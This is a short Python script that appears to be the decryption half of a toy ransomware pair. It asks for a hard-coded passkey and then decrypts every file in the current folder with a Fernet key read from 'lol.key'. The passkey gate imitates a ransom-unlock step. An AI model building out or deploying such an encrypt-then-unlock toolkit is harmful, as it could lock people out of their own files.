#C:/Program Files/Python312/python3

import os 
from cryptography.fernet import Fernet 

files = []
passkey = "cjnsd2829"

for file in os.listdir():
    if file == "equisde.py" or file == "lol.key" or file == "edsiuqe.py" or file == "LICENSE":
        continue
    if os.path.isfile(file):
        files.append(file)


with open("lol.key","rb") as key:
    secret_key = key.read()

print("Enter the passkey")
intent = input()

if intent == passkey:
    for file in  files: 
        with open(file, "rb") as dieDatei:
            contents =  dieDatei.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as dieDatei:
            dieDatei.write(contents_decrypted)
        print(file + " has been decrypted")
else:
          print("Good try!")
